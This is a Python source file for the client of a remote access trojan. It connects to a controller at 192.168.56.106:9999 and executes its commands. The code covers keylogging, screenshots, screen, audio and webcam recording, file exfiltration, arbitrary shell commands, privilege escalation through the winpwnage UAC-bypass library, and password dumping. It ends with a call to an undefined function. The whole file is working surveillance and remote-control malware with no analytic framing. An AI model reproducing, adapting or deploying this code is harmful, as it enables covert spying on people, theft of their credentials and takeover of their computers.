import socket
import subprocess
import time
import threading
import struct
from PIL import ImageGrab
import numpy as np
import cv2
from pynput.keyboard import Key, Listener
import pyaudio
import wave
import moviepy.editor as mpe
import io
import os
import tempfile
import ctypes
import sys
import platform
import Dumper

# Importing winpwnage for privilege escalation
from winpwnage.core.scanner import function as elevate
from winpwnage.core.error import WinPwnageError

server_ip = '192.168.56.106'  # IP address of the server
server_port = 9999

keylogger_running = False
audio_recording = False
screen_recording = False
audio_frames = []
video_frames = []
frame_rate = 8.0
keylogs = []  # In-memory keylogs

def keylogger():
    global keylogger_running
    keylogger_running = True
    print("Keylogger started.")  # Log keylogger start

    def on_press(key):
        try:
            keylogs.append(key.char)
        except AttributeError:
            if key == Key.space:
                keylogs.append(" ")
            elif key == Key.enter:
                keylogs.append("\n")
            else:
                keylogs.append(f" [{key}] ")

    def on_release(key):
        if key == Key.esc or not keylogger_running:
            print("Keylogger stopped.")  # Log keylogger stop
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def stop_keylogger():
    global keylogger_running
    keylogger_running = False
    time.sleep(1)  # Give some time to stop the listener
    print("Keylogger stopping...")  # Log keylogger stopping

def capture_screenshot():
    screenshot = ImageGrab.grab()
    img_byte_arr = io.BytesIO()
    screenshot.save(img_byte_arr, format='PNG')
    screenshot_data = img_byte_arr.getvalue()
    return screenshot_data

def start_audio_recording():
    global audio_recording, audio_frames
    audio_recording = True
    audio_frames = []
    p = pyaudio.PyAudio()
    fs = 44100
    print("Audio recording started.")  # Log audio recording start

    def record():
        stream = p.open(format=pyaudio.paInt16,
                        channels=2,
                        rate=fs,
                        input=True,
                        frames_per_buffer=1024)
        while audio_recording:
            data = stream.read(1024)
            audio_frames.append(data)
        stream.stop_stream()
        stream.close()
        p.terminate()
        print("Audio recording stopped.")  # Log audio recording stop

    threading.Thread(target=record).start()

def stop_audio_recording():
    global audio_recording, audio_frames
    audio_recording = False
    audio_file = io.BytesIO()
    p = pyaudio.PyAudio()
    wf = wave.open(audio_file, 'wb')
    wf.setnchannels(2)
    wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
    wf.setframerate(44100)
    wf.writeframes(b''.join(audio_frames))
    wf.close()
    audio_file.seek(0)
    return audio_file.read()

def start_screen_recording():
    global screen_recording, video_frames
    screen_recording = True
    video_frames = []
    print("Screen recording started.")  # Log screen recording start

    def record():
        start_time = time.time()
        while screen_recording and (time.time() - start_time) < 60:  # Limit recording to 60 seconds
            img = ImageGrab.grab()
            img_np = np.array(img)
            frame = cv2.cvtColor(img_np, cv2.COLOR_BGR2RGB)
            video_frames.append(frame)
            time.sleep(1 / frame_rate)  # Capture frames per second
        print("Screen recording stopped.")  # Log screen recording stop

    threading.Thread(target=record).start()
    start_audio_recording()

def stop_screen_recording():
    global screen_recording, video_frames
    screen_recording = False
    audio_file_data = stop_audio_recording()
    
    # Save video frames to a temporary file
    temp_video_file = 'temp_video.avi'
    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    height, width, layers = video_frames[0].shape
    video_out = cv2.VideoWriter(temp_video_file, fourcc, frame_rate, (width, height))

    for frame in video_frames:
        video_out.write(frame)
    video_out.release()

    # Write audio data to a temporary file
    temp_audio_file = tempfile.NamedTemporaryFile(delete=False, suffix='.wav')
    with open(temp_audio_file.name, 'wb') as f:
        f.write(audio_file_data)
    
    # Ensure the file is closed before proceeding
    temp_audio_file.close()

    # Combine video and audio
    video_clip = mpe.VideoFileClip(temp_video_file)
    audio_clip = mpe.AudioFileClip(temp_audio_file.name)
    final_clip = video_clip.set_audio(audio_clip)
    
    combined_video_file = 'combined_video.mp4'
    final_clip.write_videofile(combined_video_file, codec='libx264', audio_codec='aac')
    
    with open(combined_video_file, "rb") as f:
        combined_video_data = f.read()
    
    # Clean up temporary files
    os.remove(temp_video_file)
    os.remove(temp_audio_file.name)
    os.remove(combined_video_file)
    
    return combined_video_data

def capture_webcam():
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        return b'Error: Cannot access webcam.'

    result, image = cap.read()
    if not result:
        cap.release()
        return b'Error: Cannot capture image from webcam.'

    ret, buffer = cv2.imencode('.png', image)
    cap.release()
    if not ret:
        return b'Error: Cannot encode image.'

    return buffer.tobytes()

def get_system_info():
    try:
        info = f"""
    System Information\n
    Platform: {platform.system()}
    Platform Release: {platform.release()}
    Platform Version: {platform.version()}
    Architecture: {platform.machine()}
    Hostname: {socket.gethostname()}
    IP Address: {socket.gethostbyname(socket.gethostname())}
    Processor: {platform.processor()}
    Python Build: {platform.python_build()}
    Python Version: {platform.python_version()}
    Is Admin: {bool(ctypes.windll.shell32.IsUserAnAdmin())}
    Is System: {bool(is_system())}
        """
    except Exception as e:
        info = str(e)
    return info    

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def is_system():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() and (subprocess.getoutput('whoami') == 'nt authority\\system')
    except:
        return False

def run_elevate(u=False, e=False):
    payload = []
    if os.path.realpath(sys.argv[0]).endswith(".py"):
        payload = [f"{sys.executable}", f"\"{os.path.realpath(sys.argv[0])}\""]
    else:
        payload = [f"{os.path.realpath(sys.executable)}"]

    for i in range(1, 8):
        try:
            elevate(uac=u, persist=False, elevate=e).run(id=str(i), payload=payload)
            break
        except WinPwnageError:
            pass


def execute_command(command, client_socket):
    if command == 'start_keylogger':
        threading.Thread(target=keylogger).start()
        return "Keylogger started".encode()
    elif command == 'stop_keylogger':
        stop_keylogger()
        keylogs_data = ''.join(keylogs).encode()
        keylogs.clear()
        return keylogs_data
    elif command == 'view_keylog':
        return ''.join(keylogs).encode()
    elif command == 'capture_screenshot':
        screenshot_data = capture_screenshot()
        return screenshot_data
    elif command == 'start_audio':
        threading.Thread(target=start_audio_recording).start()
        return "Audio recording started".encode()
    elif command == 'stop_audio':
        audio_data = stop_audio_recording()
        return audio_data
    elif command == 'start_screenrecord':
        threading.Thread(target=start_screen_recording).start()
        return "Screen recording started".encode()
    elif command == 'stop_screenrecord':
        screenrecord_data = stop_screen_recording()
        return screenrecord_data
    elif command.startswith('cd '):
        path = command.split(' ', 1)[1]
        try:
            os.chdir(path)
            return f"Changed directory to {path}".encode()
        except Exception as e:
            return str(e).encode()
    elif command.startswith('download '):
        path = command.split(' ', 1)[1]
        try:
            with open(path, 'rb') as f:
                file_data = f.read()
            return file_data
        except Exception as e:
            return str(e).encode()
    elif command == 'clear':
        return "\033c".encode()  # ANSI escape code to clear the terminal
    elif command == "elevate_to_admin":
        run_elevate(u=True)
        return b'Elevated to Admin.'
    elif command == "elevate_to_system":
        run_elevate(e=True)
        return b'Elevated to System.'
    elif command == 'systeminfo':
        return get_system_info().encode()
    elif command == 'lock':
        return subprocess.getoutput('rundll32.exe user32.dll,LockWorkStation').encode()
    elif command == 'dump_password':
        dumper = Dumper.Dumper()
        passwords = dumper.getPasswords()
        return passwords.encode()
    elif command == 'ls':
        files = os.listdir()
        return "\n".join(files).encode()
    elif command == 'pwd':
        return os.getcwd().encode()
    elif command == 'whoami':
        return subprocess.getoutput('whoami').encode()
    elif command == 'is_system':
        return str(is_system()).encode()
    elif command == 'webcam':
        image_data = capture_webcam()
        return image_data
    else:
        # Execute any OS command
        try:
            result = subprocess.getoutput(command)
            return result.encode()
        except Exception as e:
            return str(e).encode()

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    client.connect((server_ip, server_port))
    print("Connected to server.")  # Log connection to server
    # Send system information upon connection
    system_info = get_system_info().encode()
    length = len(system_info)
    client.sendall(struct.pack('!I', length))  # Send length as 4 bytes
    client.sendall(system_info)
except Exception as e:
    print(f"Failed to connect: {e}")  # Log connection failure
    exit(1)
while True:
    try:
        command = client.recv(4096).decode()
        if command.lower() == 'exit':
            break
        if command in ["capture_screenshot", "stop_audio", "stop_screenrecord", "download"]:
            result_data = execute_command(command, client)
            length = len(result_data)
            client.sendall(struct.pack('!I', length))  # Send length as 4 bytes
            client.sendall(result_data)
        else:
            result = execute_command(command, client)
            length = len(result)
            client.sendall(struct.pack('!I', length))  # Send length as 4 bytes
            client.sendall(result)
    except Exception as e:
        break

client.close()
print("Connection closed.")  # Log connection closed

if __name__ == '__main__':
    connect_to_server()